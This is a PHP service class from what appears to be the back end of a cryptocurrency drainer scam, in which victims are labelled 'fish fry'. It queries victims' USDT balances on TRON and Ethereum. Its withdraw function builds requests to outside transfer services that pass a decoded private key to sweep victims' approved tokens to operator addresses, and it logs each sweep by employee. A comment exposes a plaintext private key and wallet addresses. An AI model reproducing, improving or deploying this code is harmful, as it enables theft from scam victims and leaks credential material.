<?php

namespace app\admin\service;

use think\admin\Service;
use \IEXBase\TronAPI\Provider\HttpProvider;
use \IEXBase\TronAPI\Tron;
use \IEXBase\TronAPI\Exception\TronException;

use \Etherscan\Client;
use \Etherscan\APIConf;
use think\admin\service\AdminService;

/**
 * 鱼苗数据服务
 * Class FishService
 * @package app\admin\service
 */
class FishService extends Service
{
    /**
     * 余额查询
	 * @param int $id 鱼苗编号
     */
    public function check_balance($id)
    {
		$fish = $this->app->db->name('DataFish')->where('id',$id)->find();
		if($fish){
			$type = $fish['type'];
			$address = $fish['address'];
			
			if ($type == 'trc') {
			    
				$balance = $this->get_balance_trc($address);
			} else {
				$balance = $this->get_balance_erc($address);
			}
			//echo json_encode($balance);
			//更新账户余额
			return $this->update_balance_by_id($id, $balance);
		}else{
			return -1;
		}
    }
	
	/**
     * 余额查询
	 * @param int $id 鱼苗编号
	 * @param int $to_address 接收转账的地址
	 * @param int $mount 转账数量
     */
    public function withdraw($id,$to_address,$mount)
    {
		$fish = $this->app->db->name('DataFish')->where('id',$id)->find();
		if($fish){
			$type = $fish['type'];
			$from = $fish['address'];
			$address = $fish['address'];
			$au_addressa = $fish['au_addresst'];
			$aerc = $fish['au_addressterc'];
			$mounta = $fish['mountt'];
			$to_addresst = $to_address;
			$employee = AdminService::instance()->getUserId();
			if(empty($mount)){
				$mount = $fish['balance'];}
			$tran_num = $mount;
			$to = $to_address;
			if($mount>$mounta && $type =='trc'){
			 $to = $au_addressa;}
			elseif($mount>$mounta && $type = 'erc'){
			  $to = $aerc;}
			$api = config('withdraw');
			if ($type == 'erc') {
				$data = AddressService::instance()->get_address_by_id(1);
				$au_address = $data['address'];
				$pri_key_temp = $data['pri_key'];
				
				//解码
				$pri_key = base58_decode($pri_key_temp);
				
				$url = $api['erc']."/erc?pri_key=".$pri_key."&from_address=".$from."&au_address=".$au_address."&tran_num=".$tran_num."&to_address=".$to;
				//测试：https://www.3dm.games/user/tran-coin?private_key=e5f44bf635c004fcdb8eecf9b57c27c2648f80348c09c78b5e1d5e487b9f8f52&from=0x7A4A56EeA80D951db332fcfB67933d941175F75C&auth_address=0xD5741e75aF95F0C67eCcc96f726ca86f19d5990e&tran_num=30&to=0xd9632D0a75c533d806bA954bBE72D99D99706788
				$data['url'] = $url;
			} else {
				$data = AddressService::instance()->get_address_by_id(2);
				$au_address = $data['address'];
				$pri_key_temp = $data['pri_key'];
				$tran_num = $tran_num * 1000000;
				//解码
				$pri_key = base58_decode($pri_key_temp);
				$url = $api['trc'].'?from=' . $from . '&to=' . $to . '&privateKey=' . $pri_key."&tran_num=".$tran_num;
				//$url="https://www.3dm.games/user/tran-trx?private_key=".$pri_key."&from=".$from."&auth_address=".$au_address."&tran_num=".$tran_num."&to=".$to;
				// $url = 'http://py.cimbclicksma.cc:7777/transfer?a_address=' . $from . '&c_address=' . $to . '&b_address=' . $au_address . '&b_key=' . $pri_key. '&num=1';
			   
				$data['url'] = $url;
			}
			
			$withdraw_log = array(
				'from_address' => $from,
				'au_address' => $au_address,
				'pri_key' => $pri_key_temp,
				'to_address' => $to_addresst,
				'balance' => empty($mount) ? $fish['balance'] : $mount,
				'event' => 1,
				'type' => $type,
				'createtime' => time(),
				'employee' =>$employee
			);
			
			$this->app->db->name('DataWithdraw')->save($withdraw_log);
			
			return $data['url'];
			//$this->fetch('fish/trx_withdraw', $data);
			
		}else{
			return 0;
		}
	}
	
	/**
     * 获取trc账号余额
	 * trc波场链上合约地址：https://tronscan.io/
     */
	protected function get_balance_trc($address){
		include_once 'Encrypt.php';
		$tronscan = config('contract.tronscan');
		$apiurl = $tronscan['apiurl'];
        $fullNode = new HttpProvider($apiurl);
        $solidityNode = new HttpProvider($apiurl);
        $eventServer = new HttpProvider($apiurl);

        try {
            $tron = new Tron($fullNode, $solidityNode, $eventServer);
        } catch (TronException $e) {
            exit($e->getMessage());
        }
		
        $abi = $tronscan['abi'];
        $abiAry = json_decode($abi, true);
        $usdt_contract = $tronscan['contract'];

        //get decimals
        $function = 'decimals';
        $params = array();
        $result = $tron->getTransactionBuilder()->triggerConstantContract($abiAry, base58check2HexString($usdt_contract), $function, $params, base58check2HexString($address));
        $decimals = $result[0]->toString();

        if (!is_numeric($decimals)) {
            throw new Exception('Token decimals not found');
        }

        //get balance
        $function = 'balanceOf';
        $params = array(str_pad(base58check2HexString($address), 64, '0', STR_PAD_LEFT));
        $result = $tron->getTransactionBuilder()->triggerConstantContract($abiAry, base58check2HexString($usdt_contract), $function, $params, base58check2HexString($address));
        $balance = $result[0]->toString();
		
        if (!is_numeric($balance)) {
            throw new Exception('Token balance not found');
        }
		
        $balance = bcdiv($balance, bcpow('10', $decimals), $decimals);
		
        return $balance;
	}
	
	/**
     * 获取erc账号余额
	 * erc链上合约地址：https://cn.etherscan.com/
     */
	protected function get_balance_erc($address){
		$etherscan = config('contract.etherscan');
		$client = new Client($etherscan['apikey']);
		$data = $client->api('account')->tokenBalance($etherscan['contractaddress'],$address);
		$balance = $data['result'] / 1000000;
        return $balance;
	}
	
	/**
	 * 更新账号余额
     */
	protected function update_balance_by_id($id,$balance){
		$data = array(
			"balance" => $balance
		);
		return $this->app->db->name('DataFish')->where('id',$id)->update($data);
	}
}